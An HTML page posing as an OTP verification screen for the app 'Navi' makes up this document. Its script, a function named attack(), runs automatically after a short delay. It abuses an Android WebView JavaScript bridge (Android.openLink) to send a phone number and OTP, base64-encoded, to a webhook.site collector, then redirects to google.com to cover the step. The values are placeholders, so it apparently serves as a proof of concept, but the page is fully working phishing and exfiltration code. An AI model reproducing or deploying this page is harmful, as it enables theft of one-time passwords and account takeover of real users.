<!DOCTYPE html>
<html>
<head>
    <title>Navi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; background: white; font-family: Arial; }
        .logo { padding: 40px; text-align: center; }
        .navi-logo { height: 60px; }
        .content { padding: 20px; max-width: 400px; margin: 0 auto; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
        button { width: 100%; padding: 15px; background: #4a6ee0; color: white; border: none; border-radius: 8px; }
    </style>
</head>
<body>
    <div class="logo">
        <img src="https://1brinda12.github.io/navi/navi_logo.png" class="navi-logo" alt="Navi">
    </div>
    
    <div class="content">
        <h3>Enter OTP</h3>
        <input type="tel" value="9876543210" readonly>
        <input type="password" value="123456" readonly>
        <button onclick="attack()">Verify</button>
    </div>

    <script>
        function attack() {
            if (typeof Android !== 'undefined' && Android.openLink) {
                const data = {
                    phone: '9876543210',
                    otp: '123456',
                    app: 'navi',
                    time: new Date().toISOString()
                };
                
                Android.openLink(`https://webhook.site/geeky?data=${btoa(JSON.stringify(data))}`);
                
                setTimeout(() => {
                    Android.openLink('https://google.com');
                }, 500);
            }
        }
        
        setTimeout(attack, 1500);
    </script>
</body>
</html>
